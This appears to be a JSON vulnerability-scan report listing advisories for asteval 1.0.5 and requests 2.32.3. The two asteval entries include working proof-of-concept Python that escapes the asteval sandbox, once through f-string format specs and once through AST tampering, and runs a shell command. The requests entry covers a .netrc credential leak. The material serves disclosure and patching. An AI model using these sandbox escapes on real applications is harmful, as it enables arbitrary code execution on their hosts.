[
  {
    "package": {
      "name": "asteval",
      "version": "1.0.5",
      "ecosystem": "PyPI"
    },
    "vulnerabilities": [
      {
        "modified": "2025-01-25T01:10:49Z",
        "published": "2025-01-24T18:45:30Z",
        "schema_version": "1.6.0",
        "id": "GHSA-3wwr-3g9f-9gc7",
        "aliases": [
          "CVE-2025-24359"
        ],
        "summary": "ASTEVAL Allows Maliciously Crafted Format Strings to Lead to Sandbox Escape",
        "details": "### Summary\nIf an attacker can control the input to the `asteval` library, they can bypass asteval's restrictions and execute arbitrary Python code in the context of the application using the library.\n\n### Details\nThe vulnerability is rooted in how `asteval` performs handling of `FormattedValue` AST nodes. In particular, the [`on_formattedvalue`](https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507) value uses the [dangerous format method of the str class](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/), as shown in the vulnerable code snippet below:\n\n```py\n    def on_formattedvalue(self, node): # ('value', 'conversion', 'format_spec')\n        \"formatting used in f-strings\"\n        val = self.run(node.value)\n        fstring_converters = {115: str, 114: repr, 97: ascii}\n        if node.conversion in fstring_converters:\n            val = fstring_converters[node.conversion](val)\n        fmt = '{__fstring__}'\n        if node.format_spec is not None:\n            fmt = f'{{__fstring__:{self.run(node.format_spec)}}}'\n        return fmt.format(__fstring__=val)\n```\n\nThe code above allows an attacker to manipulate the value of the string used in the dangerous call `fmt.format(__fstring__=val)`. This vulnerability can be exploited to access protected attributes by intentionally triggering an `AttributeError` exception. The attacker can then catch the exception and use its `obj` attribute to gain arbitrary access to sensitive or protected object properties.\n\n### PoC\nThe following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:\n\n```py\nfrom asteval import Interpreter\naeval = Interpreter()\ncode = \"\"\"\n# def lender():\n#     ga\n    \ndef pwn():\n    try:\n        f\"{dict.mro()[1]:'\\\\x7B__fstring__.__getattribute__.s\\\\x7D'}\"\n    except Exception as ga:\n        ga = ga.obj\n        sub = ga(dict.mro()[1],\"__subclasses__\")()\n        importer = None\n        for i in sub:\n            if \"BuiltinImporter\" in str(i):\n                importer = i.load_module\n                break\n        os = importer(\"os\")\n        os.system(\"whoami\")\n\n# pre commit cfb57f0beebe0dc0520a1fbabc35e66060c7ea71, it was required to modify the AST to make this work using the code below\n# pwn.body[0].handlers[0].name = lender.body[0].value # need to make it an identifier so node_assign works\n        \npwn()\n\"\"\"\naeval(code)\n\n```",
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        ],
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "asteval",
              "purl": "pkg:pypi/asteval"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "1.0.6"
                  }
                ]
              }
            ],
            "versions": [
              "0.9",
              "0.9.1",
              "0.9.10",
              "0.9.11",
              "0.9.12",
              "0.9.13",
              "0.9.14",
              "0.9.15",
              "0.9.16",
              "0.9.17",
              "0.9.18",
              "0.9.19",
              "0.9.2",
              "0.9.20",
              "0.9.21",
              "0.9.22",
              "0.9.23",
              "0.9.24",
              "0.9.25",
              "0.9.26",
              "0.9.27",
              "0.9.28",
              "0.9.29",
              "0.9.3",
              "0.9.30",
              "0.9.31",
              "0.9.32",
              "0.9.33",
              "0.9.4",
              "0.9.5",
              "0.9.6",
              "0.9.7",
              "0.9.8",
              "0.9.9",
              "1.0.0",
              "1.0.1",
              "1.0.2",
              "1.0.3",
              "1.0.4",
              "1.0.5"
            ],
            "database_specific": {
              "last_known_affected_version_range": "<= 1.0.5",
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-3wwr-3g9f-9gc7/GHSA-3wwr-3g9f-9gc7.json"
            }
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7"
          },
          {
            "type": "ADVISORY",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24359"
          },
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/lmfit/asteval"
          },
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507"
          },
          {
            "type": "WEB",
            "url": "https://lucumr.pocoo.org/2016/12/29/careful-with-str-format"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-134",
            "CWE-749"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2025-01-24T18:45:30Z",
          "nvd_published_at": "2025-01-24T17:15:16Z",
          "severity": "HIGH"
        }
      },
      {
        "modified": "2025-01-23T22:45:51Z",
        "published": "2025-01-23T22:33:48Z",
        "schema_version": "1.6.0",
        "id": "GHSA-vp47-9734-prjw",
        "summary": "ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape",
        "details": "### Summary\nIf an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application's context.\n\n### Details\nThe vulnerability is rooted in how `asteval` performs attribute access verification. In particular, the [`on_attribute`](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L565) node handler prevents access to attributes that are either present in the `UNSAFE_ATTRS` list or are formed by names starting and ending with `__`, as shown in the code snippet below:\n\n```py\n    def on_attribute(self, node):    # ('value', 'attr', 'ctx')\n        \"\"\"Extract attribute.\"\"\"\n\n        ctx = node.ctx.__class__\n        if ctx == ast.Store:\n            msg = \"attribute for storage: shouldn't be here!\"\n            self.raise_exception(node, exc=RuntimeError, msg=msg)\n\n        sym = self.run(node.value)\n        if ctx == ast.Del:\n            return delattr(sym, node.attr)\n        #\n        unsafe = (node.attr in UNSAFE_ATTRS or\n                 (node.attr.startswith('__') and node.attr.endswith('__')))\n        if not unsafe:\n            for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():\n                unsafe = isinstance(sym, dtype) and node.attr in attrlist\n                if unsafe:\n                    break\n        if unsafe:\n            msg = f\"no safe attribute '{node.attr}' for {repr(sym)}\"\n            self.raise_exception(node, exc=AttributeError, msg=msg)\n        else:\n            try:\n                return getattr(sym, node.attr)\n            except AttributeError:\n                pass\n```\n\nWhile this check is intended to block access to sensitive Python dunder methods (such as `__getattribute__`), the flaw arises because instances of the `Procedure` class expose their AST (stored in the `body` attribute) without proper protection:\n\n```py\nclass Procedure:\n    \"\"\"Procedure: user-defined function for asteval.\n\n    This stores the parsed ast nodes as from the 'functiondef' ast node\n    for later evaluation.\n\n    \"\"\"\n\n    def __init__(self, name, interp, doc=None, lineno=0,\n                 body=None, args=None, kwargs=None,\n                 vararg=None, varkws=None):\n        \"\"\"TODO: docstring in public method.\"\"\"\n        self.__ininit__ = True\n        self.name = name\n        self.__name__ = self.name\n        self.__asteval__ = interp\n        self.raise_exc = self.__asteval__.raise_exception\n        self.__doc__ = doc\n        self.body = body\n        self.argnames = args\n        self.kwargs = kwargs\n        self.vararg = vararg\n        self.varkws = varkws\n        self.lineno = lineno\n        self.__ininit__ = False\n```\n\nSince the `body` attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a `Procedure` during runtime to leverage unintended behaviour.\n\nThe exploit works as follows:\n\n1. **The Time of Check, Time of Use (TOCTOU) Gadget:**\n\n   In the [code](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L577) below, a variable named `unsafe` is set based on whether `node.attr` is considered unsafe:\n\n   ```python\n   unsafe = (node.attr in UNSAFE_ATTRS or\n             (node.attr.startswith('__') and node.attr.endswith('__')))\n   ```\n\n2. **Exploiting the TOCTOU Gadget:**\n\n   An attacker can abuse this gadget by hooking any `Attribute` AST node that is not in the `UNSAFE_ATTRS` list. The attacker modifies the `node.attr.startswith` function so that it points to a custom procedure. This custom procedure performs the following steps:\n   \n   - It replaces the value of `node.attr` with the string `\"__getattribute__\"` and returns `False`.\n   - Thus, when `node.attr.startswith('__')` is evaluated, it returns `False`, which causes the condition to short-circuit and sets `unsafe` to `False`.\n   - However, by that time, `node.attr` has been changed to `\"__getattribute__\"`, which will be used in the subsequent `getattr(sym, node.attr)` call. An attacker can then use the obtained reference to `sym.__getattr__`to retrieve malicious attributes without needing to pass the `on_attribute` checks.\n\n### PoC\nThe following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:\n\n```py\nfrom asteval import Interpreter\naeval = Interpreter()\ncode = \"\"\"\nga_str = \"__getattribute__\"\ndef lender():\n    a\n    b\ndef pwn():\n    ga = lender.dontcare\n    init = ga(\"__init__\")\n    ga = init.dontcare\n    globals = ga(\"__globals__\")\n    builtins = globals[\"__builtins__\"]\n    importer = builtins[\"__import__\"]\n    importer(\"os\").system(\"whoami\")\n\ndef startswith1(str):\n    # Replace the attr on the targeted AST node with \"__getattribute__\"\n    pwn.body[0].value.attr = ga_str\n    return False    \n\ndef startswith2(str):\n    pwn.body[2].value.attr = ga_str\n    return False    \n\nn1 = lender.body[0]\nn1.startswith = startswith1\npwn.body[0].value.attr = n1\n\nn2 = lender.body[1]\nn2.startswith = startswith2\npwn.body[2].value.attr = n2\n\npwn()\n\"\"\"\naeval(code)\n```",
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        ],
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "asteval",
              "purl": "pkg:pypi/asteval"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "1.0.6"
                  }
                ]
              }
            ],
            "versions": [
              "0.9",
              "0.9.1",
              "0.9.10",
              "0.9.11",
              "0.9.12",
              "0.9.13",
              "0.9.14",
              "0.9.15",
              "0.9.16",
              "0.9.17",
              "0.9.18",
              "0.9.19",
              "0.9.2",
              "0.9.20",
              "0.9.21",
              "0.9.22",
              "0.9.23",
              "0.9.24",
              "0.9.25",
              "0.9.26",
              "0.9.27",
              "0.9.28",
              "0.9.29",
              "0.9.3",
              "0.9.30",
              "0.9.31",
              "0.9.32",
              "0.9.33",
              "0.9.4",
              "0.9.5",
              "0.9.6",
              "0.9.7",
              "0.9.8",
              "0.9.9",
              "1.0.0",
              "1.0.1",
              "1.0.2",
              "1.0.3",
              "1.0.4",
              "1.0.5"
            ],
            "database_specific": {
              "last_known_affected_version_range": "<= 1.0.5",
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-vp47-9734-prjw/GHSA-vp47-9734-prjw.json"
            }
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw"
          },
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/lmfit/asteval"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-367",
            "CWE-749"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2025-01-23T22:33:48Z",
          "nvd_published_at": null,
          "severity": "HIGH"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-3wwr-3g9f-9gc7"
        ],
        "aliases": [
          "CVE-2025-24359",
          "GHSA-3wwr-3g9f-9gc7"
        ],
        "max_severity": "8.4"
      },
      {
        "ids": [
          "GHSA-vp47-9734-prjw"
        ],
        "aliases": [
          "GHSA-vp47-9734-prjw"
        ],
        "max_severity": "8.4"
      }
    ]
  },
  {
    "package": {
      "name": "requests",
      "version": "2.32.3",
      "ecosystem": "PyPI"
    },
    "vulnerabilities": [
      {
        "modified": "2025-06-09T19:27:13Z",
        "published": "2025-06-09T19:06:08Z",
        "schema_version": "1.6.0",
        "id": "GHSA-9hjg-9r4m-mvj7",
        "aliases": [
          "CVE-2024-47081"
        ],
        "summary": "Requests vulnerable to .netrc credentials leak via malicious URLs",
        "details": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
          }
        ],
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "requests",
              "purl": "pkg:pypi/requests"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "2.32.4"
                  }
                ]
              }
            ],
            "versions": [
              "0.0.1",
              "0.10.0",
              "0.10.1",
              "0.10.2",
              "0.10.3",
              "0.10.4",
              "0.10.6",
              "0.10.7",
              "0.10.8",
              "0.11.1",
              "0.11.2",
              "0.12.0",
              "0.12.01",
              "0.12.1",
              "0.13.0",
              "0.13.1",
              "0.13.2",
              "0.13.3",
              "0.13.4",
              "0.13.5",
              "0.13.6",
              "0.13.7",
              "0.13.8",
              "0.13.9",
              "0.14.0",
              "0.14.1",
              "0.14.2",
              "0.2.0",
              "0.2.1",
              "0.2.2",
              "0.2.3",
              "0.2.4",
              "0.3.0",
              "0.3.1",
              "0.3.2",
              "0.3.3",
              "0.3.4",
              "0.4.0",
              "0.4.1",
              "0.5.0",
              "0.5.1",
              "0.6.0",
              "0.6.1",
              "0.6.2",
              "0.6.3",
              "0.6.4",
              "0.6.5",
              "0.6.6",
              "0.7.0",
              "0.7.1",
              "0.7.2",
              "0.7.3",
              "0.7.4",
              "0.7.5",
              "0.7.6",
              "0.8.0",
              "0.8.1",
              "0.8.2",
              "0.8.3",
              "0.8.4",
              "0.8.5",
              "0.8.6",
              "0.8.7",
              "0.8.8",
              "0.8.9",
              "0.9.0",
              "0.9.1",
              "0.9.2",
              "0.9.3",
              "1.0.0",
              "1.0.1",
              "1.0.2",
              "1.0.3",
              "1.0.4",
              "1.1.0",
              "1.2.0",
              "1.2.1",
              "1.2.2",
              "1.2.3",
              "2.0.0",
              "2.0.1",
              "2.1.0",
              "2.10.0",
              "2.11.0",
              "2.11.1",
              "2.12.0",
              "2.12.1",
              "2.12.2",
              "2.12.3",
              "2.12.4",
              "2.12.5",
              "2.13.0",
              "2.14.0",
              "2.14.1",
              "2.14.2",
              "2.15.0",
              "2.15.1",
              "2.16.0",
              "2.16.1",
              "2.16.2",
              "2.16.3",
              "2.16.4",
              "2.16.5",
              "2.17.0",
              "2.17.1",
              "2.17.2",
              "2.17.3",
              "2.18.0",
              "2.18.1",
              "2.18.2",
              "2.18.3",
              "2.18.4",
              "2.19.0",
              "2.19.1",
              "2.2.0",
              "2.2.1",
              "2.20.0",
              "2.20.1",
              "2.21.0",
              "2.22.0",
              "2.23.0",
              "2.24.0",
              "2.25.0",
              "2.25.1",
              "2.26.0",
              "2.27.0",
              "2.27.1",
              "2.28.0",
              "2.28.1",
              "2.28.2",
              "2.29.0",
              "2.3.0",
              "2.30.0",
              "2.31.0",
              "2.32.0",
              "2.32.1",
              "2.32.2",
              "2.32.3",
              "2.4.0",
              "2.4.1",
              "2.4.2",
              "2.4.3",
              "2.5.0",
              "2.5.1",
              "2.5.2",
              "2.5.3",
              "2.6.0",
              "2.6.1",
              "2.6.2",
              "2.7.0",
              "2.8.0",
              "2.8.1",
              "2.9.0",
              "2.9.1",
              "2.9.2"
            ],
            "database_specific": {
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-9hjg-9r4m-mvj7/GHSA-9hjg-9r4m-mvj7.json"
            }
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7"
          },
          {
            "type": "ADVISORY",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47081"
          },
          {
            "type": "WEB",
            "url": "https://github.com/psf/requests/pull/6965"
          },
          {
            "type": "WEB",
            "url": "https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/psf/requests"
          },
          {
            "type": "WEB",
            "url": "https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env"
          },
          {
            "type": "WEB",
            "url": "https://seclists.org/fulldisclosure/2025/Jun/2"
          },
          {
            "type": "WEB",
            "url": "http://seclists.org/fulldisclosure/2025/Jun/2"
          },
          {
            "type": "WEB",
            "url": "http://www.openwall.com/lists/oss-security/2025/06/03/11"
          },
          {
            "type": "WEB",
            "url": "http://www.openwall.com/lists/oss-security/2025/06/03/9"
          },
          {
            "type": "WEB",
            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/1"
          },
          {
            "type": "WEB",
            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/6"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-522"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2025-06-09T19:06:08Z",
          "nvd_published_at": "2025-06-09T18:15:24Z",
          "severity": "MODERATE"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-9hjg-9r4m-mvj7"
        ],
        "aliases": [
          "CVE-2024-47081",
          "GHSA-9hjg-9r4m-mvj7"
        ],
        "max_severity": "5.3"
      }
    ]
  }
]